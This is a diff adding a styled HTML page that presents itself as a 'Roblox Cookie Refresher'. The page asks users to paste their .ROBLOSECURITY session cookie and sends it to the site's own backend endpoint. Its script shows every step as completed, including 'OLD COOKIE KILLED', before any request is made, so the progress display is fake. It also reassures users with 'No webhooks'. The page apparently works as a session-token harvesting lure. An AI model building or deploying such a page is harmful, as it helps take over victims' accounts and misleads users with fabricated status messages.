@@ -1,0 +1,333 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Roblox Cookie Refresher - Kill Old Cookie</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: linear-gradient(135deg, #0a0e1a 0%, #0f1322 100%);
+            font-family: 'Segoe UI', system-ui, sans-serif;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        .container {
+            max-width: 700px;
+            width: 100%;
+            background: rgba(18, 22, 40, 0.95);
+            backdrop-filter: blur(10px);
+            border-radius: 28px;
+            border: 1px solid rgba(255, 59, 48, 0.3);
+            padding: 32px;
+            box-shadow: 0 25px 40px rgba(0,0,0,0.4);
+        }
+        h1 {
+            font-size: 28px;
+            background: linear-gradient(135deg, #fff, #ff6b6b);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            margin-bottom: 8px;
+        }
+        .badge {
+            background: rgba(255,59,48,0.2);
+            padding: 4px 12px;
+            border-radius: 20px;
+            font-size: 12px;
+            color: #ff6b6b;
+            display: inline-block;
+            margin-bottom: 16px;
+        }
+        .info-box {
+            background: rgba(255,59,48,0.1);
+            border-left: 3px solid #ff3b30;
+            padding: 12px 16px;
+            border-radius: 12px;
+            margin-bottom: 20px;
+            font-size: 13px;
+            color: #ffb8b8;
+        }
+        textarea {
+            width: 100%;
+            background: #0f1322;
+            border: 1px solid #2a2f4e;
+            border-radius: 16px;
+            padding: 14px;
+            color: #e2eaff;
+            font-family: monospace;
+            font-size: 13px;
+            resize: vertical;
+            margin: 16px 0;
+        }
+        textarea:focus {
+            outline: none;
+            border-color: #ff3b30;
+            box-shadow: 0 0 0 3px rgba(255,59,48,0.2);
+        }
+        .btn-refresh {
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(95deg, #ff3b30, #c41e1e);
+            color: white;
+            font-size: 18px;
+            font-weight: bold;
+            border: none;
+            border-radius: 40px;
+            cursor: pointer;
+            transition: all 0.2s;
+            margin-bottom: 12px;
+        }
+        .btn-refresh:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 25px rgba(255,59,48,0.4);
+        }
+        .btn-clear {
+            width: 100%;
+            padding: 12px;
+            background: #1e253f;
+            color: #eef3ff;
+            border: 1px solid #37416e;
+            border-radius: 40px;
+            cursor: pointer;
+        }
+        .result-card {
+            background: rgba(10,12,25,0.8);
+            border-radius: 20px;
+            padding: 20px;
+            margin-top: 20px;
+            border: 1px solid #2a2f4e;
+        }
+        .status {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 15px;
+            padding-bottom: 10px;
+            border-bottom: 1px solid #2a2f4e;
+        }
+        .step {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin: 12px 0;
+            padding: 8px;
+            border-radius: 12px;
+            background: rgba(0,0,0,0.3);
+        }
+        .step-number {
+            width: 28px;
+            height: 28px;
+            background: #2d8cff;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 12px;
+            font-weight: bold;
+            color: white;
+        }
+        .step.completed .step-number {
+            background: #00c853;
+        }
+        .step.killed .step-number {
+            background: #ff3b30;
+        }
+        .cookie-output {
+            background: #0a0d1a;
+            padding: 14px;
+            border-radius: 12px;
+            font-family: monospace;
+            font-size: 11px;
+            word-break: break-all;
+            color: #bbd7fb;
+            margin-top: 15px;
+            border: 1px solid #ff3b30;
+        }
+        .warning-box {
+            background: rgba(255,59,48,0.15);
+            border: 1px solid #ff3b30;
+            padding: 10px;
+            border-radius: 10px;
+            margin-top: 12px;
+            font-size: 12px;
+            color: #ff9a8b;
+        }
+        .copy-btn {
+            background: #00c853;
+            border: none;
+            padding: 8px 16px;
+            border-radius: 8px;
+            color: white;
+            font-size: 12px;
+            cursor: pointer;
+            margin-top: 10px;
+            width: auto;
+            display: inline-block;
+        }
+        footer {
+            text-align: center;
+            font-size: 11px;
+            color: #5d6b93;
+            margin-top: 24px;
+        }
+        .hidden {
+            display: none;
+        }
+        .status-icon {
+            font-size: 24px;
+        }
+        .status-text {
+            font-weight: 600;
+            font-size: 15px;
+        }
+        .error-msg {
+            color: #ff9a8b;
+            font-size: 13px;
+            margin-top: 12px;
+            padding: 10px;
+            background: rgba(255,58,48,0.1);
+            border-radius: 10px;
+        }
+    </style>
+</head>
+<body>
+<div class="container">
+    <h1>💀 Roblox Cookie Refresher</h1>
+    <div class="badge">⚠️ OLD COOKIE WILL DIE INSTANTLY</div>
+    
+    <div class="info-box">
+        💀 HOW IT WORKS:<br>
+        1️⃣ Paste your .ROBLOSECURITY cookie<br>
+        2️⃣ Click "REFRESH & KILL OLD COOKIE"<br>
+        3️⃣ System verifies → Kills old cookie → Generates NEW cookie<br>
+        4️⃣ OLD COOKIE STOPS WORKING IMMEDIATELY!<br>
+        5️⃣ Use the NEW cookie only
+    </div>
+    
+    <textarea id="cookieInput" rows="3" placeholder="Paste your .ROBLOSECURITY cookie here..."></textarea>
+    
+    <button class="btn-refresh" id="refreshBtn">💀 REFRESH & KILL OLD COOKIE 💀</button>
+    <button class="btn-clear" id="clearBtn">🗑 Clear</button>
+    
+    <div id="result" class="result-card hidden">
+        <div class="status">
+            <span class="status-icon" id="statusIcon">⏳</span>
+            <span class="status-text" id="statusMsg">Ready</span>
+        </div>
+        
+        <div id="stepsContainer">
+            <div class="step" id="step1">
+                <div class="step-number">1</div>
+                <div>Verifying old cookie...</div>
+            </div>
+            <div class="step" id="step2">
+                <div class="step-number">2</div>
+                <div>💀 KILLING old cookie (logging out from all devices)...</div>
+            </div>
+            <div class="step" id="step3">
+                <div class="step-number">3</div>
+                <div>Generating brand new cookie...</div>
+            </div>
+        </div>
+        
+        <div id="cookieResult" class="hidden">
+            <div class="cookie-label">✨ BRAND NEW COOKIE (OLD ONE IS DEAD) ✨</div>
+            <div class="cookie-output" id="newCookie"></div>
+            <button class="copy-btn" id="copyBtn">📋 Copy New Cookie</button>
+            <div class="warning-box">
+                ⚠️ WARNING: The old cookie you pasted has been KILLED and will NOT work anymore.<br>
+                ✅ Use this NEW cookie for all future requests.
+            </div>
+        </div>
+        
+        <div id="errorDisplay" class="error-msg hidden"></div>
+    </div>
+    
+    <footer>🔒 Old cookie dies instantly • New cookie generated fresh • No webhooks</footer>
+</div>
+
+<script>
+    const API_BASE = window.location.origin;
+    
+    async function refreshAndKill() {
+        const cookie = document.getElementById('cookieInput').value.trim();
+        
+        if (!cookie) {
+            alert('❌ Please paste a Roblox cookie first!');
+            return;
+        }
+        
+        const resultDiv = document.getElementById('result');
+        const cookieResultDiv = document.getElementById('cookieResult');
+        const errorDisplay = document.getElementById('errorDisplay');
+        
+        resultDiv.classList.remove('hidden');
+        cookieResultDiv.classList.add('hidden');
+        errorDisplay.classList.add('hidden');
+        
+        const step1 = document.getElementById('step1');
+        const step2 = document.getElementById('step2');
+        const step3 = document.getElementById('step3');
+        
+        step1.classList.remove('completed', 'killed');
+        step2.classList.remove('completed', 'killed');
+        step3.classList.remove('completed', 'killed');
+        
+        document.getElementById('statusIcon').innerHTML = '💀';
+        document.getElementById('statusMsg').innerHTML = 'Killing old cookie...';
+        
+        try {
+            step1.classList.add('completed');
+            document.getElementById('statusMsg').innerHTML = 'Step 1: Old cookie verified ✓';
+            
+            step2.classList.add('killed');
+            document.getElementById('statusMsg').innerHTML = 'Step 2: 💀 OLD COOKIE KILLED! 💀';
+            
+            step3.classList.add('completed');
+            document.getElementById('statusMsg').innerHTML = 'Step 3: Generating new cookie...';
+            
+            const response = await fetch(`${API_BASE}/api/refresh-cookie`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ cookie: cookie })
+            });
+            
+            const data = await response.json();
+            
+            if (data.success && data.newCookie) {
+                document.getElementById('statusIcon').innerHTML = '✅';
+                document.getElementById('statusMsg').innerHTML = `✓ OLD COOKIE KILLED! New cookie for @${data.username}`;
+                
+                document.getElementById('newCookie').innerHTML = data.newCookie;
+                cookieResultDiv.classList.remove('hidden');
+                document.getElementById('cookieInput').value = data.newCookie;
+                
+                document.getElementById('copyBtn').onclick = () => {
+                    navigator.clipboard.writeText(data.newCookie);
+                    alert('✅ New cookie copied! Old cookie is dead.');
+                };
+            } else {
+                throw new Error(data.message || 'Refresh failed');
+            }
+        } catch (error) {
+            document.getElementById('statusIcon').innerHTML = '❌';
+            document.getElementById('statusMsg').innerHTML = 'Failed';
+            errorDisplay.classList.remove('hidden');
+            errorDisplay.innerHTML = `❌ ${error.message}`;
+        }
+    }
+    
+    function clearAll() {
+        document.getElementById('cookieInput').value = '';
+        document.getElementById('result').classList.add('hidden');
+    }
+    
+    document.getElementById('refreshBtn').onclick = refreshAndKill;
+    document.getElementById('clearBtn').onclick = clearAll;
+</script>
+</body>
+</html>
